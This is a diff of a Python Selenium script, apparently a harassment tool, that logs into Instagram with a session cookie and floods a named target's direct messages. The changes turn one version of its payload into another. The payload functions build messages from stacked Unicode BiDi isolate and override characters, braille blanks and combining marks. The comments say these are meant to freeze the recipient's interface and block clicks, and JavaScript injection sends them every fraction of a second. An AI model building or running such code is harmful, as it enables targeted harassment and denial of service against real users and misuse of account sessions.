@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (DESKTOP-CRUSHER V15)
-# 📅 STATUS: MAIN-THREAD LOCK | x15 DENSITY | 10-AGENT BLITZ
+# 🚀 PROJECT: PRAVEER NC (CLICK-KILLER V20)
+# 📅 STATUS: EVENT-LOOP HIJACK | x20 DENSITY | GHOST INJECTION
 
 import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
@@ -10,33 +10,32 @@ from selenium.webdriver.chrome.options import Options
 
 # --- MATRIX CONFIG ---
 THREADS = 2
-SESSION_LIMIT = 300 # Longer session for total memory exhaustion
+SESSION_LIMIT = 300 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_desktop_crusher_payload(target_name):
-    """The Desktop-Crusher: Forces Reflow-Loops & UI Thread Lock."""
-    # 💥 THE 'LAYOUT BLIND' (Horizontal expansion)
-    # Forces the desktop chat window to calculate an impossible width.
+def get_click_killer_payload(target_name):
+    """The Click-Killer: Disables UI interaction via Isolate Nesting."""
+    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 UI_INTERACTION_BLOCKED: {target_name.upper()}\n"
+    
+    # 💥 THE 'ISOLATE TRAP' (Recursive Nesting)
+    # This forces the browser to traverse 150 layers for every mouse-click event.
+    isolate_trap = "\u2066\u2067\u2068" * 150 
+    
+    # 💥 THE 'WIDTH-BOMB' (Horizontal Displacement)
     width_bomb = "\u2800\u00A0" * 150 
     
-    # 💥 THE 'REFRESH-TRAP' (Variation Selector-16)
-    # Forces the browser to check for 'color' glyphs for every character.
-    color_trap = "\ufe0f" * 50
+    # 💥 DENSITY x20 (200 marks per character)
+    # Total GPU saturation.
+    z_tower = "̸" * 200
     
-    # 💥 DENSITY x15 (150 marks per character)
-    # Pushes the GPU and Layout engine to the absolute limit.
-    z_tower = "̸" * 150
+    lines = [header, isolate_trap]
     
-    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 DESKTOP_LOCKDOWN: {target_name.upper()}\n"
-    
-    lines = [header, width_bomb, color_trap]
-    
-    for i in range(70):
-        # BiDi Recursion to hang the Windows/Linux/MacOS text engine
-        prefix = "\u202E\u2066" if i % 2 == 0 else "\u202D\u2067"
-        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_FREEZE{z_tower}")
+    for i in range(75):
+        # We alternate 'First Strong Isolate' markers to break the button's event listener
+        prefix = "\u2068\u202E" if i % 2 == 0 else "\u2069\u202D"
+        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_LOCKED{z_tower}")
         
-    return "\n".join(lines)[:9980]
+    return "\n".join(lines)[:9990]
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -52,7 +51,7 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ DESKTOP-CRUSHER DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ CLICK-KILLER V20 DEPLOYED...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
@@ -64,28 +63,29 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
             session_start = time.time()
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
-                    payload = get_desktop_crusher_payload(target_name)
+                    payload = get_click_killer_payload(target_name)
                     
-                    # 🔥 DIRECT JS INJECTION (Bypasses Runner Lag)
+                    # 🔥 THE GHOST INJECTION (Bypasses UI Lag)
                     driver.execute_script("""
                         var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
                         if (box) {
+                            // Direct State Injection
                             box.focus();
                             document.execCommand('insertText', false, arguments[0]);
                             box.dispatchEvent(new Event('input', { bubbles: true }));
                             
-                            // Aggressive Send Click
+                            // Native Click Dispatch to bypass the target's UI lag
                             var btns = document.querySelectorAll('div[role="button"]');
                             for(var b of btns) {
                                 if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
-                                    b.click();
+                                    b.dispatchEvent(new MouseEvent('click', {view: window, bubbles: true, cancelable: true}));
                                 }
                             }
                         }
                     """, payload)
                     
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 DESKTOP LOCKED", flush=True)
-                    time.sleep(random.uniform(0.1, 0.4)) 
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 UI_LOCKED", flush=True)
+                    time.sleep(random.uniform(0.1, 0.3)) 
                     
                 except:
                     time.sleep(5)
